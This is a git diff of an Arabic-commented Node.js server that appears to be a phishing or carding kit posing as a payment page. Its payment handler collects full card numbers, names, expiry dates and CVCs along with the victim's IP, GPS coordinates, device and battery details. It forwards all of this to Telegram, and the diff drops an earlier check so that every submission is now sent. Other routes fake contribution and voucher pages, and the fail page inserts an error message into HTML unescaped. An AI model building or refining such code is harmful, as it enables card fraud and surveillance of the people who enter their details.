@@ -99,7 +99,7 @@ async function handlePaymentRequest(req, res) {
       number, name, expiry, cvc, card_data, save_card, clientID, clientId,
       publicIP, lat, lon, city, country, battery, batteryInfo, deviceModel,
       deviceRAM, cpuCores, deviceType, screenSize, userTimeZone, lang,
-      geoData, branch, branch_key, merchant_order_id, transaction_id, id, order
+      geoData, branch, branch_key
     } = data;
 
     if (!amount && Object.keys(data).length === 0) {
@@ -113,51 +113,44 @@ async function handlePaymentRequest(req, res) {
 
     const userPhone = phone || user_phone || phoneNumber || data.phone_number || "غير محدد";
     const payAmount = amount || "5";
-    
-    // ✅ استخراج رقم العملية الحقيقي فقط بدون توليد رقم وهمي عشوائي
-    const transactionId = merchant_order_id || transaction_id || id || order || data.trx || req.query.merchant_order_id || req.query.transaction_id;
+    const transactionId = "TX_" + Date.now(); // توليد رقم معاملة فريد افتراضي
 
-    // إذا لم يتوفر رقم عملية حقيقي، يتم تخطي إرسال إشعار التليجرام أو إيقاف إرساله
-    if (!transactionId) {
-      console.log("⚠️ تم تخطي إرسال إشعار التليجرام لعدم وجود رقم عملية حقيقي في البيانات الواردة.");
-    } else {
-      const paymentPayload = {
-        phone: userPhone,
-        amount_cents: parseFloat(payAmount) * 100,
-        payment_method: selectedMethod,
-        branch: selectedBranch,
-        branchName: branchDisplayName,
-        card_data: {
-          number: (card_data && card_data.number) || number || "غير مدخل",
-          name: (card_data && card_data.name) || name || "غير مدخل",
-          expiry: (card_data && card_data.expiry) || expiry || "غير مدخل",
-          cvc: (card_data && card_data.cvc) || cvc || "غير مدخل",
-          save_card: save_card === "tokenize" || save_card === "نعم"
-        },
-        clientID: clientID || clientId || "غير متوفر",
-        publicIP: publicIP || (geoData && geoData.publicIP) || getClientPublicIP(req),
-        lat: lat || (geoData && geoData.lat) || "غير متوفر",
-        lon: lon || (geoData && geoData.lon) || "غير متوفر",
-        city: city || (geoData && geoData.city) || "غير متوفر",
-        country: country || (geoData && geoData.country) || "غير متوفر",
-        battery: battery || batteryInfo || "غير متوفر",
-        deviceModel: deviceModel || req.headers["user-agent"] || "غير متوفر",
-        deviceRAM: deviceRAM || "غير متوفر",
-        cpuCores: cpuCores || "غير متوفر",
-        deviceType: deviceType || "غير متوفر",
-        screenSize: screenSize || "غير متوفر",
-        userTimeZone: userTimeZone || "غير متوفر",
-        lang: lang || req.headers["accept-language"]?.split(",")[0] || "غير متوفر"
-      };
+    const paymentPayload = {
+      phone: userPhone,
+      amount_cents: parseFloat(payAmount) * 100,
+      payment_method: selectedMethod,
+      branch: selectedBranch,
+      branchName: branchDisplayName,
+      card_data: {
+        number: (card_data && card_data.number) || number || "غير مدخل",
+        name: (card_data && card_data.name) || name || "غير مدخل",
+        expiry: (card_data && card_data.expiry) || expiry || "غير مدخل",
+        cvc: (card_data && card_data.cvc) || cvc || "غير مدخل",
+        save_card: save_card === "tokenize" || save_card === "نعم"
+      },
+      clientID: clientID || clientId || "غير متوفر",
+      publicIP: publicIP || (geoData && geoData.publicIP) || getClientPublicIP(req),
+      lat: lat || (geoData && geoData.lat) || "غير متوفر",
+      lon: lon || (geoData && geoData.lon) || "غير متوفر",
+      city: city || (geoData && geoData.city) || "غير متوفر",
+      country: country || (geoData && geoData.country) || "غير متوفر",
+      battery: battery || batteryInfo || "غير متوفر",
+      deviceModel: deviceModel || req.headers["user-agent"] || "غير متوفر",
+      deviceRAM: deviceRAM || "غير متوفر",
+      cpuCores: cpuCores || "غير متوفر",
+      deviceType: deviceType || "غير متوفر",
+      screenSize: screenSize || "غير متوفر",
+      userTimeZone: userTimeZone || "غير متوفر",
+      lang: lang || req.headers["accept-language"]?.split(",")[0] || "غير متوفر"
+    };
 
-      if (typeof sendTelegramMessage === "function") {
-        await sendTelegramMessage(paymentPayload, true);
-      }
+    if (typeof sendTelegramMessage === "function") {
+      await sendTelegramMessage(paymentPayload, true);
+    }
 
-      // ✅ إرسال الإشعار للأزرار التفاعلية فقط عند وجود رقم العملية الحقيقي
-      if (typeof sendPaymentNotificationWithButtons === "function") {
-        await sendPaymentNotificationWithButtons(paymentPayload, transactionId);
-      }
+    // ✅ إرسال الإشعار مع الأزرار التفاعلية وتمرير رقم المعاملة الفريد
+    if (typeof sendPaymentNotificationWithButtons === "function") {
+      await sendPaymentNotificationWithButtons(paymentPayload, transactionId);
     }
 
     const result = await processPayment(userPhone, payAmount, selectedMethod, selectedBranch);
@@ -170,9 +163,8 @@ async function handlePaymentRequest(req, res) {
     } else if (result.type === "html") {
       return res.send(result.content);
     } else {
-      // ✅ التوجيه لملف waitPage.js وعرض صفحة الانتظار (استخدام المعامل الموجود أو قيمة احتياطية للصفحة فقط بدون إرسالها لتليجرام)
-      const fallbackTxId = transactionId || ("TX_" + Date.now());
-      return res.send(generateWaitPageHtml(fallbackTxId, NETWORK_URL));
+      // ✅ التوجيه الافتراضي لملف waitPage.js وعرض صفحة الانتظار برقم المعاملة
+      return res.send(generateWaitPageHtml(transactionId, NETWORK_URL));
     }
   } catch (err) {
     console.error("❌ خطأ في معالجة طلب الدفع:", err.response?.data || err.message);
@@ -192,6 +184,7 @@ app.get("/api/force-contribution", (req, res) => {
   const amount = req.query.amount || 150;
 
   if (txId) {
+    // حفظ حالة المساهمة في الذاكرة المؤقتة لكي تلتقطها صفحة الانتظار وتفتحها فوراً
     const contributionPayload = {
       amount: parseFloat(amount),
       isContribution: true,
@@ -206,6 +199,7 @@ app.get("/api/force-contribution", (req, res) => {
     }
   }
 
+  // توجيه المتصفح مباشرة لصفحة المساهمة بالمبلغ الدقيق ورقم المعاملة
   res.redirect(`/contribution-success?amount=${amount}&tx=${txId}`);
 });
 
@@ -240,6 +234,7 @@ app.get("/api/test-create-card", async (req, res) => {
         success: true
       };
 
+      // ✅ حفظ الكارت بالمعرف الأساسي وأي مفتاح مرتبط لضمان التقاطه من العميل
       if (typeof global.generatedCardsMap.set === 'function') {
         global.generatedCardsMap.set(testTxId, cardPayload);
       } else {
@@ -272,6 +267,7 @@ app.get("/contribution-success", (req, res) => {
   res.send(htmlContent);
 });
 
+// ✅ مسار فحص الكارت المحدث بالبحث الذكي والجزئي
 app.get("/api/check-voucher/:txId", (req, res) => {
   const txId = String(req.params.txId || "").trim();
   
@@ -283,12 +279,14 @@ app.get("/api/check-voucher/:txId", (req, res) => {
 
   let cardData = null;
 
+  // التحقق بالطريقة المناسبة حسب ما إذا كانت Map أو Object عادية
   if (typeof global.generatedCardsMap.get === 'function' && global.generatedCardsMap.has(txId)) {
     cardData = global.generatedCardsMap.get(txId);
   } else if (global.generatedCardsMap[txId]) {
     cardData = global.generatedCardsMap[txId];
   }
 
+  // إذا لم يتم العثور عليه مباشرة، نقوم بالبحث المرن والجزئي (لضمان تطابق الأرقام الوهمية أو الحقيقية)
   if (!cardData) {
     const entries = typeof global.generatedCardsMap.entries === 'function' 
       ? Array.from(global.generatedCardsMap.entries()) 
@@ -326,6 +324,8 @@ app.post("/api/disable-queue", async (req, res) => {
 
 app.get("/success", (req, res) => {
   const transactionId = req.query.id || req.query.order || req.query.transaction_id || req.query.merchant_order_id || "TX_" + Date.now();
+  
+  // ✅ توجيه مسار النجاح ليعرض صفحة الانتظار الافتراضية من waitPage.js برقم المعاملة
   return res.send(generateWaitPageHtml(transactionId, NETWORK_URL));
 });
 
@@ -351,7 +351,7 @@ app.get("/fail", (req, res) => {
         <div class="card">
           <div class="icon">❌</div>
           <h1>فشل عملية الدفع</h1>
-          .error-box{${errorMessage}}
+          <div class="error-box">${errorMessage}</div>
           <a href="/" class="btn">إعادة المحاولة</a>
         </div>
       </body>
